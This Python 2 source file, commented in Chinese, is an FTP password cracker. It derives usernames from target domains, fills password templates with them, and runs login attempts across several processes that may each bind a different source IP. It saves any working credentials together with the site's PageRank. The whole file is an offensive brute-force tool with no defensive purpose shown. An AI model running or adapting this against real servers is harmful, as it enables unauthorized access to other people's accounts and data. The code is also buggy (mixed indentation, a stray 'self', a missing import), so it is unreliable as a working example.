#-*-coding:utf-8-*-
from ftplib import FTP
import threading as thread  # 导入线程模块
import pr
from collections import defaultdict, deque
from multiprocessing import Process,Lock,Queue

##############################################################################################################
#   FTP 破解 多线程部分。
###############################################################################################################
class PythonFtpScanner():
    def __init__(self,hostA="", link_times=3,link_timeout=40, password = [], current_count=0):
        self.Chost=hostA
        self.password = password
	self.current_count = current_count
	
    def ftp_begin_crack(self):
        return self.ftp_crack(self.Chost)
        pass
    def get_sdomain(self,domain):  #域名拆解www.baidu.com->baidu.com
        suffixes = 'ac', 'ad', 'ae', 'aero', 'af', 'ag', 'ai', 'al', 'am', 'an', 'ao', 'aq', 'ar', 'arpa', 'as', 'asia', 'at', 'au', 'aw', 'ax', 'az', 'ba', 'bb', 'bd', 'be', 'bf', 'bg', 'bh', 'bi', 'biz', 'bj', 'bm', 'bn', 'bo', 'br', 'bs', 'bt', 'bv', 'bw', 'by', 'bz', 'ca', 'cat', 'cc', 'cd', 'cf', 'cg', 'ch', 'ci', 'ck', 'cl', 'cm', 'cn', 'co', 'com', 'coop', 'cr', 'cu', 'cv', 'cx', 'cy', 'cz', 'de', 'dj', 'dk', 'dm', 'do', 'dz', 'ec', 'edu', 'ee', 'eg', 'er', 'es', 'et', 'eu', 'fi', 'fj', 'fk', 'fm', 'fo', 'fr', 'ga', 'gb', 'gd', 'ge', 'gf', 'gg', 'gh', 'gi', 'gl', 'gm', 'gn', 'gov', 'gp', 'gq', 'gr', 'gs', 'gt', 'gu', 'gw', 'gy', 'hk', 'hm', 'hn', 'hr', 'ht', 'hu', 'id', 'ie', 'il', 'im', 'in', 'info', 'int', 'io', 'iq', 'ir', 'is', 'it', 'je', 'jm', 'jo', 'jobs', 'jp', 'ke', 'kg', 'kh', 'ki', 'km', 'kn', 'kp', 'kr', 'kw', 'ky', 'kz', 'la', 'lb', 'lc', 'li', 'lk', 'lr', 'ls', 'lt', 'lu', 'lv', 'ly', 'ma', 'mc', 'md', 'me', 'mg', 'mh', 'mil', 'mk', 'ml', 'mm', 'mn', 'mo', 'mobi', 'mp', 'mq', 'mr', 'ms', 'mt', 'mu', 'mv', 'mw', 'mx', 'my', 'mz', 'na', 'name', 'nc', 'ne', 'net', 'nf', 'ng', 'ni', 'nl', 'no', 'np', 'nr', 'nu', 'nz', 'om', 'org', 'pa', 'pe', 'pf', 'pg', 'ph', 'pk', 'pl', 'pm', 'pn', 'pr', 'pro', 'ps', 'pt', 'pw', 'py', 'qa', 're', 'ro', 'rs', 'ru', 'rw', 'sa', 'sb', 'sc', 'sd', 'se', 'sg', 'sh', 'si', 'sj', 'sk', 'sl', 'sm', 'sn', 'so', 'sr', 'st', 'su', 'sv', 'sy', 'sz', 'tc', 'td', 'tel', 'tf', 'tg', 'th', 'tj', 'tk', 'tl', 'tm', 'tn', 'to', 'tp', 'tr', 'tt', 'tv', 'tw', 'tz', 'ua', 'ug', 'uk', 'us', 'uy', 'uz', 'va', 'vc', 've', 'vg', 'vi', 'vn', 'vu', 'wf', 'ws', 'xn', 'ye', 'yt', 'za', 'zm', 'zw'
        sdomain = []
        bdomain = False
        for section in domain.split('.'):
            if section in suffixes:
                sdomain.append(section)
                bdomain = True
            else:
                sdomain = [section]
        return '.'.join(sdomain) if bdomain  else ''

    def get_ssdomain(self,domain):  #域名拆解www.baidu.com->baidu
        sdomain = self.get_sdomain(domain)  #先解析一道
        ssdomian = sdomain.partition('.')[0] if sdomain else ''
        return ssdomian

    def ftp_crack(self,host,nthreads=10,port=21): #传入名域名开始扫描
        if host == '':  #传入值等于空   返回
            return False
	username = "%ssdomain%"
        domain = host   
        ssdomain = self.get_ssdomain(domain)  #域名拆解www.baidu.com->baidu
        accounts = deque()   #list数组
	
	username = username.replace('%ssdomain%',ssdomain)
	password_count = 0
	for password in self.password: 
	    if(password_count < self.current_count):
		continue       # 前面几个抛弃掉
	    if(password_count > self.current_count +1):
		break         # 一次只要两个就可以
	    password_count = password_count + 1
	    password = password.replace('%user%',username)
	    if (username,password) not in accounts:#list数组
		accounts.append((username,password))#添加到 list数组
		##################################################################
        if not accounts:   #数组无数据了就跳出
            return False
	# 启动四个进程
	crack_set = []
	q = Queue()
	lock = Lock()
	for process_id in range(0,4):
	    crack_thread = Process(target=crack,args=(accounts,domain,2,lock,q,process_id))
	    crack_set.append(crack_thread)
	    crack_thread.start()
	for item in crack_set:
	    item.join()
        try:	
	    return q.get()
	except:
	    return False
def crack(accounts, domain,retry_limit,lock,q,process_id):
    ftp = FTP()
    retry = 0
    port = 21
    account = None   #None=NULL  数组
    bind_ip = ""
    if(process_id == 1):
	bind_ip = ""
    elif(process_id == 2):
	bind_ip = ""
    elif(process_id == 3):
	bind_ip = ""
    if(bind_ip != ""):
	try:
	    true_socket = socket.socket
	    def bound_socket(*a, **k):
		sock = true_socket(*a, **k)
		sock.bind((bind_ip, 0))
		return sock
	    socket.socket = bound_socket
	except Exception, e:
	    return False
    
    while accounts:#list数组
	try:
	    ftp.connect(domain,port)  #连接 服务器名  端口号
	except Exception, e:
	    if retry <= retry_limit: 
		retry = retry +1    
		continue  #跳过
	    else:
		return  False #跳出
	try_cnt = 0
	while try_cnt < 3:
	    lock.acquire()
	    if not account and accounts:#list数组
		account = accounts.popleft()   #list数组  输出
	    lock.release()
	    if not account:   #数组无数据了就跳出
		return False     # 表示失败
	    try_cnt = try_cnt + 1
	    try:
		self.ftp.login(account[0],account[1])  #连接FTP
		#没有异常发生，这是一个正确的帐号
		# 计算PR值
		pr_class = pr.Prer()
		pr_value = pr_class.getPr(self.domain)
		success_ftp = []
		success_ftp.append(account[0])
		success_ftp.append(account[1])
		success_ftp.append(self.domain)
		success_ftp.append("/#")
		success_ftp.append(pr_value)
		q.put(success_ftp)
		return True
	    except Exception, e:
		emsg = str(e)    #调试信息
		if 'connection' in emsg.lower() or 'tries' in emsg.lower():   #判断 连接  失败错误信息    不明白何意
		    retry = retry +1
		    break   #跳出
		else:
		    #reset retry
		    account = None  #None=NULL
		    retry = 0
